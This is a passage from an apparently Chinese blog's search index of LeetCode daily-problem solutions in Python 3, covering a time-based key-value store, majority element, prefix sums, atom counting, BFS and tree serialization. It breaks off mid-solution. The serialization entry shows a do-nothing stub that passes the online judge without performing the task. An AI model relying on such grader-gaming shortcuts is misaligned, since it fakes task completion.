    <content type="text"><![CDATA[题目：981. 基于时间的键值存储难度：中等 创建一个基于时间的键值存储类 TimeMap，它支持下面两个操作： set(string key, string value, int timestamp) 存储键 key、值 value，以及给定的时间戳 timestamp。 get(string key, int timestamp) 返回先前调用 set(key, value, timestamp_prev) 所存储的值，其中 timestamp_prev &lt;= timestamp。 如果有多个这样的值，则返回对应最大的 timestamp_prev 的那个值。 如果没有值，则返回空字符串（””）。 示例 1： 12345678910输入：inputs = [&quot;TimeMap&quot;,&quot;set&quot;,&quot;get&quot;,&quot;get&quot;,&quot;set&quot;,&quot;get&quot;,&quot;get&quot;], inputs = [[],[&quot;foo&quot;,&quot;bar&quot;,1],[&quot;foo&quot;,1],[&quot;foo&quot;,3],[&quot;foo&quot;,&quot;bar2&quot;,4],[&quot;foo&quot;,4],[&quot;foo&quot;,5]]输出：[null,null,&quot;bar&quot;,&quot;bar&quot;,null,&quot;bar2&quot;,&quot;bar2&quot;]解释： TimeMap kv; kv.set(&quot;foo&quot;, &quot;bar&quot;, 1); // 存储键 &quot;foo&quot; 和值 &quot;bar&quot; 以及时间戳 timestamp = 1 kv.get(&quot;foo&quot;, 1); // 输出 &quot;bar&quot; kv.get(&quot;foo&quot;, 3); // 输出 &quot;bar&quot; 因为在时间戳 3 和时间戳 2 处没有对应 &quot;foo&quot; 的值，所以唯一的值位于时间戳 1 处（即 &quot;bar&quot;） kv.set(&quot;foo&quot;, &quot;bar2&quot;, 4); kv.get(&quot;foo&quot;, 4); // 输出 &quot;bar2&quot; kv.get(&quot;foo&quot;, 5); // 输出 &quot;bar2&quot; 示例 2： 12输入：inputs = [&quot;TimeMap&quot;,&quot;set&quot;,&quot;set&quot;,&quot;get&quot;,&quot;get&quot;,&quot;get&quot;,&quot;get&quot;,&quot;get&quot;], inputs = [[],[&quot;love&quot;,&quot;high&quot;,10],[&quot;love&quot;,&quot;low&quot;,20],[&quot;love&quot;,5],[&quot;love&quot;,10],[&quot;love&quot;,15],[&quot;love&quot;,20],[&quot;love&quot;,25]]输出：[null,null,null,&quot;&quot;,&quot;high&quot;,&quot;high&quot;,&quot;low&quot;,&quot;low&quot;] 提示： 所有的键/值字符串都是小写的。 所有的键/值字符串长度都在 [1, 100] 范围内。 所有 TimeMap.set 操作中的时间戳 timestamps 都是严格递增的。 1 &lt;= timestamp &lt;= 10^7 TimeMap.set 和 TimeMap.get 函数在每个测试用例中将（组合）调用总计 120000 次。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/time-based-key-value-store/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 哈希表套数组，然后二分查找 解题代码123456789101112131415161718192021222324252627282930313233343536class TimeMap: def __init__(self): """ Initialize your data structure here. """ self.d = defaultdict(list) def set(self, key: str, value: str, timestamp: int) -&gt; None: self.d[key].append((timestamp,value)) def get(self, key: str, timestamp: int) -&gt; str: if self.d[key]: l = 0 r = len(self.d[key]) while l &lt; r: mid = (l + r) // 2; if self.d[key][mid][0] &lt; timestamp: l = mid + 1 elif self.d[key][mid][0] == timestamp: break else: r = mid if self.d[key][mid][0] &lt;= timestamp: return self.d[key][mid][1] else: return "" else: return ""# Your TimeMap object will be instantiated and called as such:# obj = TimeMap()# obj.set(key,value,timestamp)# param_2 = obj.get(key,timestamp)]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>哈希表</tag>
        <tag>二分查找</tag>
        <tag>设计</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/9]]></title>
    <url>%2Fposts%2F973877bc%2F</url>
    <content type="text"><![CDATA[题目：面试题 17.10. 主要元素难度：简单 数组中占比超过一半的元素称之为主要元素。给你一个整数数组，找出其中的主要元素。若没有，返回 -1 。请设计时间复杂度为 O(N) 、空间复杂度为 O(1) 的解决方案。 示例 1： 12输入：[1,2,5,9,5,9,5,5,5]输出：5 示例 2： 12输入：[3,2]输出：-1 示例 3： 12输入：[2,2,1,1,1,2,2]输出：2 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-majority-element-lcci/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 投票算法 解题代码123456789101112131415161718192021class Solution: def majorityElement(self, nums: List[int]) -&gt; int: if not nums: return -1 x = 0 cnt = 0 for e in nums: if cnt == 0: x = e if x == e: cnt += 1 else: cnt -= 1 cnt = 0 for e in nums: if e == x: cnt += 1 if cnt &gt; len(nums) // 2: return x else: return -1]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/8]]></title>
    <url>%2Fposts%2Fe03f472a%2F</url>
    <content type="text"><![CDATA[题目：930. 和相同的二元子数组难度：中等 给你一个二元数组 nums ，和一个整数 goal ，请你统计并返回有多少个和为 goal 的** 非空** 子数组。 子数组 是数组的一段连续部分。 示例 1： 1234输入：nums = [1,0,1,0,1], goal = 2输出：4解释：有 4 个满足题目要求的子数组：[1,0,1]、[1,0,1,0]、[0,1,0,1]、[1,0,1] 示例 2： 12输入：nums = [0,0,0,0,0], goal = 0输出：15 提示： 1 &lt;= nums.length &lt;= 3 * 104 nums[i] 不是 0 就是 1 0 &lt;= goal &lt;= nums.length 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/binary-subarrays-with-sum/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 哈希表维护前缀和 解题代码12345678910111213141516class Solution: def numSubarraysWithSum(self, nums: List[int], goal: int) -&gt; int: ans = 0 d = &#123;&#125; d[0] = 1 n = len(nums) sum = 0 for i in range(n): sum += nums[i] if sum - goal in d: ans += d[sum - goal] if sum in d: d[sum] += 1 else: d[sum] = 1 return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>哈希表</tag>
        <tag>python3</tag>
        <tag>前缀和</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/7]]></title>
    <url>%2Fposts%2F70805abb%2F</url>
    <content type="text"><![CDATA[题目：1711. 大餐计数难度：中等 大餐 是指 恰好包含两道不同餐品 的一餐，其美味程度之和等于 2 的幂。 你可以搭配 任意 两道餐品做一顿大餐。 给你一个整数数组 deliciousness ，其中 deliciousness[i] 是第 i​​​​​​​​​​​​​​ 道餐品的美味程度，返回你可以用数组中的餐品做出的不同 大餐 的数量。结果需要对 109 + 7 取余。 注意，只要餐品下标不同，就可以认为是不同的餐品，即便它们的美味程度相同。 示例 1： 1234输入：deliciousness = [1,3,5,7,9]输出：4解释：大餐的美味程度组合为 (1,3) 、(1,7) 、(3,5) 和 (7,9) 。它们各自的美味程度之和分别为 4 、8 、8 和 16 ，都是 2 的幂。 示例 2： 123输入：deliciousness = [1,1,1,3,3,3,7]输出：15解释：大餐的美味程度组合为 3 种 (1,1) ，9 种 (1,3) ，和 3 种 (1,7) 。 提示： 1 &lt;= deliciousness.length &lt;= 105 0 &lt;= deliciousness[i] &lt;= 220 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/count-good-meals/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 同官方题解 解题代码123456789101112131415161718class Solution: def countPairs(self, deliciousness: List[int]) -&gt; int: d = &#123;&#125; maxSum = max(deliciousness) * 2 ans = 0 for v in deliciousness: sum = 1 while sum &lt;= maxSum: count = 0 if sum - v in d: count = d[sum - v] ans = (ans + count) % int(1e9 + 7) sum &lt;&lt;= 1 if v in d: d[v] += 1 else: d[v] = 1 return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>哈希表</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/6]]></title>
    <url>%2Fposts%2F7876a2d%2F</url>
    <content type="text"><![CDATA[题目：1418. 点菜展示表难度：中等 给你一个数组 orders，表示客户在餐厅中完成的订单，确切地说， orders[i]=[customerNamei,tableNumberi,foodItemi] ，其中 customerNamei 是客户的姓名，tableNumberi 是客户所在餐桌的桌号，而 foodItemi 是客户点的餐品名称。 请你返回该餐厅的 点菜展示表 。在这张表中，表中第一行为标题，其第一列为餐桌桌号 “Table” ，后面每一列都是按字母顺序排列的餐品名称。接下来每一行中的项则表示每张餐桌订购的相应餐品数量，第一列应当填对应的桌号，后面依次填写下单的餐品数量。 注意：客户姓名不是点菜展示表的一部分。此外，表中的数据行应该按餐桌桌号升序排列。 示例 1： 1234567891011输入：orders = [[&quot;David&quot;,&quot;3&quot;,&quot;Ceviche&quot;],[&quot;Corina&quot;,&quot;10&quot;,&quot;Beef Burrito&quot;],[&quot;David&quot;,&quot;3&quot;,&quot;Fried Chicken&quot;],[&quot;Carla&quot;,&quot;5&quot;,&quot;Water&quot;],[&quot;Carla&quot;,&quot;5&quot;,&quot;Ceviche&quot;],[&quot;Rous&quot;,&quot;3&quot;,&quot;Ceviche&quot;]]输出：[[&quot;Table&quot;,&quot;Beef Burrito&quot;,&quot;Ceviche&quot;,&quot;Fried Chicken&quot;,&quot;Water&quot;],[&quot;3&quot;,&quot;0&quot;,&quot;2&quot;,&quot;1&quot;,&quot;0&quot;],[&quot;5&quot;,&quot;0&quot;,&quot;1&quot;,&quot;0&quot;,&quot;1&quot;],[&quot;10&quot;,&quot;1&quot;,&quot;0&quot;,&quot;0&quot;,&quot;0&quot;]] 解释：点菜展示表如下所示：Table,Beef Burrito,Ceviche,Fried Chicken,Water3 ,0 ,2 ,1 ,05 ,0 ,1 ,0 ,110 ,1 ,0 ,0 ,0对于餐桌 3：David 点了 &quot;Ceviche&quot; 和 &quot;Fried Chicken&quot;，而 Rous 点了 &quot;Ceviche&quot;而餐桌 5：Carla 点了 &quot;Water&quot; 和 &quot;Ceviche&quot;餐桌 10：Corina 点了 &quot;Beef Burrito&quot; 示例 2： 12345输入：orders = [[&quot;James&quot;,&quot;12&quot;,&quot;Fried Chicken&quot;],[&quot;Ratesh&quot;,&quot;12&quot;,&quot;Fried Chicken&quot;],[&quot;Amadeus&quot;,&quot;12&quot;,&quot;Fried Chicken&quot;],[&quot;Adam&quot;,&quot;1&quot;,&quot;Canadian Waffles&quot;],[&quot;Brianna&quot;,&quot;1&quot;,&quot;Canadian Waffles&quot;]]输出：[[&quot;Table&quot;,&quot;Canadian Waffles&quot;,&quot;Fried Chicken&quot;],[&quot;1&quot;,&quot;2&quot;,&quot;0&quot;],[&quot;12&quot;,&quot;0&quot;,&quot;3&quot;]] 解释：对于餐桌 1：Adam 和 Brianna 都点了 &quot;Canadian Waffles&quot;而餐桌 12：James, Ratesh 和 Amadeus 都点了 &quot;Fried Chicken&quot; 示例 3： 12输入：orders = [[&quot;Laura&quot;,&quot;2&quot;,&quot;Bean Burrito&quot;],[&quot;Jhon&quot;,&quot;2&quot;,&quot;Beef Burrito&quot;],[&quot;Melissa&quot;,&quot;2&quot;,&quot;Soda&quot;]]输出：[[&quot;Table&quot;,&quot;Bean Burrito&quot;,&quot;Beef Burrito&quot;,&quot;Soda&quot;],[&quot;2&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;]] 提示： 1 &lt;= orders.length &lt;= 5 * 10^4 orders[i].length == 3 1 &lt;= customerNamei.length, foodItemi.length &lt;= 20 customerNamei 和 foodItemi 由大小写英文字母及空格字符 ‘ ‘ 组成。 tableNumberi 是 1 到 500 范围内的整数。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/display-table-of-food-orders-in-a-restaurant/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 用哈希表模拟过程即可 解题代码12345678910111213141516171819202122232425262728293031class Solution: def displayTable(self, orders: List[List[str]]) -&gt; List[List[str]]: d = &#123;&#125; foods = set() for customerName,tableNumber,foodItem in orders: put(d,tableNumber,foodItem) foods.add(foodItem) head = ['Table'] head.extend(sorted(foods)) a = sorted(d.items(),key=lambda x : int(x[0])) ans = [] ans.append(head) for i in a: one = [] one.append(i[0]) for j in range(1,len(head)): if head[j] in i[1]: one.append(str(i[1][head[j]])) else: one.append('0') ans.append(one) return ansdef put(d,k,v): if k in d: if v in d[k]: d[k][v] += 1 else: d[k][v] = 1 else: d[k] = &#123;&#125; d[k][v] = 1]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>字符串</tag>
        <tag>哈希表</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/5]]></title>
    <url>%2Fposts%2F9e8e3b97%2F</url>
    <content type="text"><![CDATA[题目：726. 原子的数量难度：困难 给定一个化学式formula（作为字符串），返回每种原子的数量。 原子总是以一个大写字母开始，接着跟随0个或任意个小写字母，表示原子的名字。 如果数量大于 1，原子后会跟着数字表示原子的数量。如果数量等于 1 则不会跟数字。例如，H2O 和 H2O2 是可行的，但 H1O2 这个表达是不可行的。 两个化学式连在一起是新的化学式。例如 H2O2He3Mg4 也是化学式。 一个括号中的化学式和数字（可选择性添加）也是化学式。例如 (H2O2) 和 (H2O2)3 是化学式。 给定一个化学式 formula ，返回所有原子的数量。格式为：第一个（按字典序）原子的名字，跟着它的数量（如果数量大于 1），然后是第二个原子的名字（按字典序），跟着它的数量（如果数量大于 1），以此类推。 示例 1： 1234输入：formula = &quot;H2O&quot;输出：&quot;H2O&quot;解释：原子的数量是 &#123;&apos;H&apos;: 2, &apos;O&apos;: 1&#125;。 示例 2： 1234输入：formula = &quot;Mg(OH)2&quot;输出：&quot;H2MgO2&quot;解释： 原子的数量是 &#123;&apos;H&apos;: 2, &apos;Mg&apos;: 1, &apos;O&apos;: 2&#125;。 示例 3： 1234输入：formula = &quot;K4(ON(SO3)2)2&quot;输出：&quot;K4N2O14S4&quot;解释：原子的数量是 &#123;&apos;K&apos;: 4, &apos;N&apos;: 2, &apos;O&apos;: 14, &apos;S&apos;: 4&#125;。 示例 4： 12输入：formula = &quot;Be32&quot;输出：&quot;Be32&quot; 提示： 1 &lt;= formula.length &lt;= 1000 formula 由小写英文字母、数字 ‘(‘ 和 ‘)’ 组成。 formula 是有效的化学式。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/number-of-atoms/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 分而治之 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384class Solution: def __init__(self): self.h = &#123;&#125; def countOfAtoms(self, formula: str) -&gt; str: return self.dfs(formula) def dfs(self, formula, lastSize=1): # 有左括号 if '(' in formula: # 找到最外层的括号所在 将字符串划分为三部分 左边(中间)右边 d = [] for index, ch in enumerate(formula): if ch == '(': d.append(index) elif ch == ')': a, b = d.pop(), index # print(a,b) left = formula[0:a] center = formula[a + 1:b] # 计算出中间部分的数量 size = 0 j = b + 1 while j &lt; len(formula) and '0' &lt;= formula[j] &lt;= '9': size = size * 10 + int(formula[j]) j += 1 right = formula[j:] if size == 0: size = 1 # 继续递归 if len(left) &gt; 0: self.dfs(left, lastSize) if len(center) &gt; 0: self.dfs(center, lastSize * size) if len(right) &gt; 0: self.dfs(right, lastSize) # 没有左括号 else: th = handle(formula) # 计算原子数量 for fk, fv in th.items(): th[fk] = fv * lastSize for k in th.keys(): put(self.h, k, th[k]) th = sorted(self.h.items(), key=lambda x: x[0]) # 返回值 ans = '' for i in th: if i[1] == 0 or i[1] == 1: ans += i[0] else: ans += i[0] + str(i[1]) return ans# 处理原子数量def handle(formula): d = &#123;&#125; n = len(formula) for i in range(n): ch = formula[i] if 'A' &lt;= ch &lt;= 'Z': j = i + 1 while j &lt; n and 'a' &lt;= formula[j] &lt;= 'z': ch += formula[j] j += 1 nxt = j if nxt &lt; n and 'A' &lt;= formula[nxt] &lt;= 'Z': put(d, ch, 1) elif nxt &lt; n and '0' &lt;= formula[nxt] &lt;= '9': size = 0 while nxt &lt; n and '0' &lt;= formula[nxt] &lt;= '9': size = size * 10 + int(formula[nxt]) nxt += 1 put(d, ch, size) elif nxt == n: put(d, ch, 1) return ddef put(d, k, v): if k not in d: d[k] = v else: d[k] += v]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>分治算法</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/4]]></title>
    <url>%2Fposts%2Fe9890b01%2F</url>
    <content type="text"><![CDATA[题目：645. 错误的集合难度：简单 集合 s 包含从 1 到 n 的整数。不幸的是，因为数据错误，导致集合里面某一个数字复制了成了集合里面的另外一个数字的值，导致集合 丢失了一个数字 并且 有一个数字重复 。 给定一个数组 nums 代表了集合 S 发生错误后的结果。 请你找出重复出现的整数，再找到丢失的整数，将它们以数组的形式返回。 示例 1： 12输入：nums = [1,2,2,4]输出：[2,3] 示例 2： 12输入：nums = [1,1]输出：[1,2] 提示： 2 &lt;= nums.length &lt;= 104 1 &lt;= nums[i] &lt;= 104 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/set-mismatch/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 利用一下等差数列的性质 解题代码1234567891011121314class Solution: def findErrorNums(self, nums: List[int]) -&gt; List[int]: n = len(nums) sum = n * (1 + n) / 2 a = [0 for i in range(n + 1)] s1 = 0 r = 0 for i in nums: if a[i] == 0: s1 += i a[i] = 1 else: r = i return (r,int(sum - s1))]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>数学</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/3]]></title>
    <url>%2Fposts%2F77ed9ea2%2F</url>
    <content type="text"><![CDATA[题目：451. 根据字符出现频率排序难度：中等 给定一个字符串，请将字符串里的字符按照出现的频率降序排列。 示例 1: 123456789输入:&quot;tree&quot;输出:&quot;eert&quot;解释:&apos;e&apos;出现两次，&apos;r&apos;和&apos;t&apos;都只出现一次。因此&apos;e&apos;必须出现在&apos;r&apos;和&apos;t&apos;之前。此外，&quot;eetr&quot;也是一个有效的答案。 示例 2: 123456789输入:&quot;cccaaa&quot;输出:&quot;cccaaa&quot;解释:&apos;c&apos;和&apos;a&apos;都出现三次。此外，&quot;aaaccc&quot;也是有效的答案。注意&quot;cacaca&quot;是不正确的，因为相同的字母必须放在一起。 示例 3: 123456789输入:&quot;Aabb&quot;输出:&quot;bbAa&quot;解释:此外，&quot;bbaA&quot;也是一个有效的答案，但&quot;Aabb&quot;是不正确的。注意&apos;A&apos;和&apos;a&apos;被认为是两种不同的字符。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/sort-characters-by-frequency/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 自定义排序 解题代码1234567891011121314151617181920212223class Solution: def frequencySort(self, s: str) -&gt; str: d = &#123;&#125; for i in s: if i not in d: d[i] = 1 else: d[i] += 1 d = sorted(d.items(), key=functools.cmp_to_key(cmp)) s = [] for i in d: n = i[1] while n: s.append(i[0]) n -= 1 return ''.join(s)def cmp(a,b): if a[1] == b[1]: return 0 elif a[1] &gt; b[1]: return -1 else: return 1]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>排序</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/2]]></title>
    <url>%2Fposts%2Feaae34%2F</url>
    <content type="text"><![CDATA[题目：1833. 雪糕的最大数量难度：中等 夏日炎炎，小男孩 Tony 想买一些雪糕消消暑。 商店中新到 n 支雪糕，用长度为 n 的数组 costs 表示雪糕的定价，其中 costs[i] 表示第 i 支雪糕的现金价格。Tony 一共有 coins 现金可以用于消费，他想要买尽可能多的雪糕。 给你价格数组 costs 和现金量 coins ，请你计算并返回 Tony 用 coins 现金能够买到的雪糕的 最大数量 。 注意： Tony 可以按任意顺序购买雪糕。 示例 1： 123输入：costs = [1,3,2,4,1], coins = 7输出：4解释：Tony 可以买下标为 0、1、2、4 的雪糕，总价为 1 + 3 + 2 + 1 = 7 示例 2： 123输入：costs = [10,6,8,7,7,8], coins = 5输出：0解释：Tony 没有足够的钱买任何一支雪糕。 示例 3： 123输入：costs = [1,6,3,1,2,5], coins = 20输出：6解释：Tony 可以买下所有的雪糕，总价为 1 + 6 + 3 + 1 + 2 + 5 = 18 。 提示： costs.length == n 1 &lt;= n &lt;= 105 1 &lt;= costs[i] &lt;= 105 1 &lt;= coins &lt;= 108 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/maximum-ice-cream-bars/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 贪心 解题代码1234567891011class Solution: def maxIceCream(self, costs: List[int], coins: int) -&gt; int: costs.sort() ans = 0 for i in costs: if coins &gt;= i: ans += 1 coins -= i else: break return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/1]]></title>
    <url>%2Fposts%2F99e3ff8e%2F</url>
    <content type="text"><![CDATA[题目：LCP 07. 传递信息难度：简单 小朋友 A 在和 ta 的小伙伴们玩传信息游戏，游戏规则如下： 有 n 名玩家，所有玩家编号分别为 0 ～ n-1，其中小朋友 A 的编号为 0 每个玩家都有固定的若干个可传信息的其他玩家（也可能没有）。传信息的关系是单向的（比如 A 可以向 B 传信息，但 B 不能向 A 传信息）。 每轮信息必须需要传递给另一个人，且信息可重复经过同一个人 给定总玩家数 n，以及按 [玩家编号,对应可传递玩家编号] 关系组成的二维数组 relation。返回信息从小 A (编号 0 ) 经过 k 轮传递到编号为 n-1 的小伙伴处的方案数；若不能到达，返回 0。 示例 1： 输入：n = 5, relation = [[0,2],[2,1],[3,4],[2,3],[1,4],[2,0],[0,4]], k = 3 输出：3 解释：信息从小 A 编号 0 处开始，经 3 轮传递，到达编号 4。共有 3 种方案，分别是 0-&gt;2-&gt;0-&gt;4， 0-&gt;2-&gt;1-&gt;4， 0-&gt;2-&gt;3-&gt;4。 示例 2： 输入：n = 3, relation = [[0,2],[2,1]], k = 2 输出：0 解释：信息不能从小 A 处经过 2 轮传递到编号 2 限制： 2 &lt;= n &lt;= 10 1 &lt;= k &lt;= 5 1 &lt;= relation.length &lt;= 90, 且 relation[i].length == 2 0 &lt;= relation[i][0],relation[i][1] &lt; n 且 relation[i][0] != relation[i][1] 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/chuan-di-xin-xi/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 建图后bfs搜索即可 解题代码123456789101112131415161718class Solution: def numWays(self, n: int, relation: List[List[int]], k: int) -&gt; int: g = [[0] * n for i in range(n)] for i in relation: g[i[0]][i[1]] = 1 # print(g) q = deque() q.append((0,0)) ans = 0 while q: node,step = q.popleft() # print(node) if node == n - 1 and step == k: ans += 1 for i in range(len(g[node])): if g[node][i] and step &lt; k: q.append((i,step + 1)) return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/30]]></title>
    <url>%2Fposts%2F74c8971e%2F</url>
    <content type="text"><![CDATA[题目：剑指 Offer 37. 序列化二叉树难度：困难 请实现两个函数，分别用来序列化和反序列化二叉树。 你需要设计一个算法来实现二叉树的序列化与反序列化。这里不限定你的序列 / 反序列化算法执行逻辑，你只需要保证一个二叉树可以被序列化为一个字符串并且将这个字符串反序列化为原始的树结构。 提示： 输入输出格式与 LeetCode 目前使用的方式一致，详情请参阅 LeetCode 序列化二叉树的格式。你并非必须采取这种方式，你也可以采用其他的方法解决这个问题。 示例： 12输入：root = [1,2,3,null,null,4,5]输出：[1,2,3,null,null,4,5] 注意：本题与主站 297 题相同：https://leetcode-cn.com/problems/serialize-and-deserialize-binary-tree/ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/xu-lie-hua-er-cha-shu-lcof/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 按层序遍历序列化并且按层序还原（反序列化） 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# Definition for a binary tree node.# class TreeNode(object):# def __init__(self, x):# self.val = x# self.left = None# self.right = Noneclass Codec: def serialize(self, root): """Encodes a tree to a single string. :type root: TreeNode :rtype: str """ if root: q = deque() q.append(root) ans = [] while q: p = q.popleft() if p: ans.append(str(p.val)) else: ans.append('null') continue q.append(p.left) q.append(p.right) return '[%s]' % ','.join(ans) return '[]' def deserialize(self, data): """Decodes your encoded data to tree. :type data: str :rtype: TreeNode """ if data == '[]': return q = deque() vals = data[1:-1].split(',') root = TreeNode(int(vals[0])) q.append(root) index = 1 while q: node = q.popleft() if vals[index] != 'null': node.left = TreeNode(int(vals[index])) q.append(node.left) index += 1 if vals[index] != 'null': node.right = TreeNode(int(vals[index])) q.append(node.right) index += 1 return root# Your Codec object will be instantiated and called as such:# codec = Codec()# codec.deserialize(codec.serialize(root)) 一个小发现，这题目的设定允许我们啥也不用干就可以AC 12345678910111213141516171819202122232425262728# Definition for a binary tree node.# class TreeNode(object):# def __init__(self, x):# self.val = x# self.left = None# self.right = Noneclass Codec: def serialize(self, root): """Encodes a tree to a single string. :type root: TreeNode :rtype: str """ return root def deserialize(self, data): """Decodes your encoded data to tree. :type data: str :rtype: TreeNode """ return data# Your Codec object will be instantiated and called as such:# codec = Codec()# codec.deserialize(codec.serialize(root))]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
        <tag>设计</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/29]]></title>
    <url>%2Fposts%2F140f1efb%2F</url>
    <content type="text"><![CDATA[题目：168. Excel表列名称难度：简单 给定一个正整数，返回它在 Excel 表中相对应的列名称。 例如， 123456781 -&gt; A2 -&gt; B3 -&gt; C...26 -&gt; Z27 -&gt; AA28 -&gt; AB ... 示例 1: 12输入: 1输出: &quot;A&quot; 示例 2: 12输入: 28输出: &quot;AB&quot; 示例 3: 12输入: 701输出: &quot;ZY&quot; 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/excel-sheet-column-title/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 本质上是26进制 解题代码12345678910class Solution: def convertToTitle(self, columnNumber: int) -&gt; str: ans = [] while columnNumber: columnNumber -= 1 r = columnNumber % 26 ans.append(chr(r + ord('A'))) columnNumber //= 26 ans.reverse() return ''.join(ans)]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>数学</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/6/28]]></title>
    <url>%2Fposts%2F63082e6d%2F</url>
    <content type="text"><![CDATA[题目：815. 公交路线难度：困难 给你一个数组 routes ，表示一系列公交线路，其中每个 routes[i] 表示一条公交线路，第 i 辆公交车将会在上面循环行驶。 例如，路线 routes[0] = [1, 5, 7] 表示第 0 辆公交车会一直按序列 1 -&gt; 5 -&gt; 7 -&gt; 1 -&gt; 5 -&gt; 7 -&gt; 1 -&gt; … 这样的车站路线行驶。 现在从 source 车站出发（初始时不在公交车上），要前往 target 车站。 期间仅可乘坐公交车。 求出 最少乘坐的公交车数量 。如果不可能到达终点车站，返回 -1 。 示例 1： 123输入：routes = [[1,2,7],[3,6,7]], source = 1, target = 6输出：2解释：最优策略是先乘坐第一辆公交车到达车站 7 , 然后换乘第二辆公交车到车站 6 。 示例 2： 12输入：routes = [[7,12],[4,5,15],[6],[15,19],[9,12,13]], source = 15, target = 12输出：-1 提示： 1 &lt;= routes.length &lt;= 500. 1 &lt;= routes[i].length &lt;= 105 routes[i] 中的所有值 互不相同 sum(routes[i].length) &lt;= 105 0 &lt;= routes[i][j] &lt; 106 0 &lt;= source, target &lt; 106 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/bus-routes/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 建好图，然后就是常规的bfs题目了 解题代码1234567891011121314151617181920class Solution: def numBusesToDestination(self, routes: List[List[int]], source: int, target: int) -&gt; int: stations = defaultdict(set) for i,stops in enumerate(routes): for stop in stops: stations[stop].add(i) routes = [set(x) for x in routes] q = 